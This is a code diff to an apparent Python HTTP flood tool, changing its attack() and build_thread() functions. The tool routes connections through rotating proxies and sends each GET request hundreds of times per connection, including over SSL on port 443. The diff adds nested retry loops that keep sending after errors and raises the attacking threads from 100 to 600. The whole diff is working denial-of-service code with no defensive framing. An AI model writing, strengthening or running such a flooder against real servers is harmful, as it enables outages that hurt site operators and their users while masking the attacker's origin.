@@ -105,27 +105,54 @@ def attack():
         s.connect((ip, port))
         num_sent = num_sent + 1
         print("[+]", num_sent, " Sent ", proxy, " => ", ip , ":", port)
-        if port == 443:
-            x = ssl.wrap_socket(s)
-            try:
-                for i in range (100):
-                    sent = x.send(str.encode(request))
-                    if not sent:
-                        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-                        break
-            except:
-                x.close()
+        try:
+            if port == 443:
+                x = ssl.wrap_socket(s)
                 try:
-                    for i in range(100):
-                        sent = x.send(str.encode(request))
-                        if not sent:
-                            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
-                            break
+                    for i in range (100):
+                        x.send(str.encode(request))
                 except:
-                    x.close()
+                    for i in range (100):
+                        x.send(str.encode(request))
+                    try:
+                        for i in range (100):
+                            x.send(str.encode(request))
+                    except:
+                        for i in range (100):
+                            x.send(str.encode(request))
+                        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+        except:
+            for i in range (300):
+                x.send(str.encode(request))
+            try:
+                get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+                request = get_host + header
+                s = socks.socksocket()
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.connect((ip, port))
+                num_sent = num_sent + 1
+                print("[+]", num_sent, " Sent ", proxy, " => ", ip , ":", port)
+                if port == 443:
+                    x = ssl.wrap_socket(s)
+                    try:
+                        for i in range (100):
+                            x.send(str.encode(request))
+                    except:
+                        for i in range (100):
+                            x.send(str.encode(request))
+                        try:
+                            for i in range (100):
+                                x.send(str.encode(request))
+                        except:
+                            for i in range (100):
+                                x.send(str.encode(request))
+            except:
+                for i in range (100):
+                    x.send(str.encode(request))
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
 
 def build_thread():
-	for _ in range(100):
+	for _ in range(600):
 		bth = threading.Thread(target=attack)
 		bth.start()
 
